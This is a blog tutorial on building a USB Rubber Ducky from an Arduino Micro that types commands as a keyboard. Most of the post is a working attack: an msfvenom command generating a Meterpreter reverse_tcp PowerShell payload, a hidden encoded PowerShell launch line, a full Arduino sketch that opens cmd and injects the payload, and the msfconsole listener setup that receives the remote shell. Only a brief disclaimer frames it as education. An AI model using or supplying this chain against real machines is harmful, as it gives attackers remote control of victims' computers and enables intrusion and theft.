---
title: "USB Rubber Ducky with Arduino Micro"
date: 17 March 2019
---

***DISCLAIMER:*** *This is merely a proof of concept for education purposes. Use it only against your own networks and devices!*

In this post I will show you how to open a [meterpreter backdoor](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/) in a target Windows system using a Arduino Micro acting as a HID keyboard. This attack vector was first developed by the [Hak5](https://shop.hak5.org) community, given the name [Rubber Ducky](https://github.com/hak5darren/USB-Rubber-Ducky/wiki). It basically exploits the fact that some micro-controllers have the capacity to act as a [HID](https://en.wikipedia.org/wiki/Human_interface_device), which you can use to send commands as if they were coming from a plugged in keyboard.

# Requirements

## Metasploit Framework

[Metasploit](https://www.metasploit.com) is a penetration testing framework which we will use to generate the payload, listen to the backdoor and spawn a meterpreter shell on the target system. The site provides various installers for OS X, Windows (32-bit) and Linux, I will be doing this on a Debian Linux system, but there is no reason why it wouldn't work on any other.

## Arduino Micro

[Arduino Micro](https://store.arduino.cc/usa/arduino-micro) is the smallest Arduino board using a micro-controller capable of HID simulation ([ATmega32U4](https://www.microchip.com/wwwproducts/ATmega32u4)) in our case. We will also use the Arduino IDE to program the board.

# Code

## msfvenom

First the will need to generate the things which the Arduino will "type". This will be a `reverse_tcp` payload delivered with a Powershell command. Once in `msfconsole`, you can type

```python
msfvenom -p windows/x64/meterpreter/reverse_tcp -f psh-cmd LPORT=4444 LHOST=YOUR_IP_ADDRESS -o rbr0
```

If the target Windows machine is in your local network, then replace `YOUR_IP_ADDRESS` with your local IP address. If the target machine is outside your network, then you will need to provide your global IP address (try `curl icanhazip.com`). However, this will also require [port forwarding](https://portforward.com) if you are behind a router. I am doing this on a [Google Cloud VM instance](https://cloud.google.com/compute/docs/instances/), so I simply had to setup a firewall rule to allow all incoming `tcp:4444` connections. This command will produce a file named `rbr` with a content similar to:

```c
%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG ...
```
This command is basically what will allow us to spawn a meterpreter shell in the target system. Now we will have to find a way to "type" it.

## Arduino

The Arduino [Keyboard](https://www.arduino.cc/reference/en/language/functions/usb/keyboard/) library allows one to "send keystrokes to an attached computer through their micro’s native USB port". So our job is to simply save the command as a string and then type it out. However, there is a subtle problem: the command is about 7KB's. The onboard SRAM memory storing the code variables on the ATmega32U4 only has a 2.5 KB capacity. This means we will have to use the onboard flash memory of 32 KB, since the command to be typed out doesn't change. The Arduino IDE provides the keyword [PROGMEM](https://www.arduino.cc/reference/en/language/variables/utilities/progmem/) for this. Data stored in this manner also has its own functions for access, so use caution.

The command is to be written on the Windows Command Prompt, so we will also have to send the keystrokes Windows(❖) + R then type `cmd` then press `ENTER` to get a `cmd` window.

Below is the Arduino sketch that I have come up with:

```Cpp
/*
 *    USB Rubber Ducky with Arduino Micro
 *    
 *    Provided the output of a psh-cmd from msfvenom, this code spawns a meterpreter session in the Windows target machine.
 *    The psh-cmd is stored in the FLASH memory, so the maximum command size is about 28KB in an Arduino Micro.
 *    The whole thing takes about 16 seconds to execute with a command of 7KB.
 *    
 *    Created 17 March 2019
 *    By Mirac L. Gulgonul
 *    
 *    https://mlg556.github.io
 *    
 *    This work is licensed under a Creative Commons Attribution-ShareAlike 3.0 Unported License
 *    https://creativecommons.org/licenses/by-sa/3.0/
 */

#include "Keyboard.h"

const char command[] PROGMEM = {}; // Array pre-allocation on the FLASH memory to store the command.
char chr; // Variable to store the current character of the command.

// The main method, initialises the Keyboard module, opens the Command Prompt and sends the command.
void setup() {
    Keyboard.begin();
    delay(500); // The minimum delay needed.
    cmdOpen();
    typer();
    Keyboard.write(KEY_RETURN);
}

// Does nothing
void loop() {}

// Sends the keystrokes of the psh-command by looping through every character and using Keyboard.write()
void typer() {
    for (int i = 0; i < strlen_P(command); i++) {
        chr = pgm_read_byte_near(command + i);
        Keyboard.write(chr);
    }
}

// Opens the command prompt: hitting Windows+R, typing "cmd" and pressing ENTER.
void cmdOpen() {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(30);
    Keyboard.releaseAll();
    delay(100);
    Keyboard.println("cmd");
    Keyboard.write(KEY_RETURN);
    delay(500);
}
```

## msfconsole

Now that the payload is ready to be "typed", we have to be listening to it. In `msfconsole`, type:

```ruby
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
```

Now that we are listening, you can finally insert your Arduino/Rubber Ducky to the target machine. If all goes well (my version takes about 16 seconds in total) you will be presented with a meterpreter session. Go crazy with it! (or type `help`).

# Downloads

[rubber.ino](files/rubber.ino)

$\space$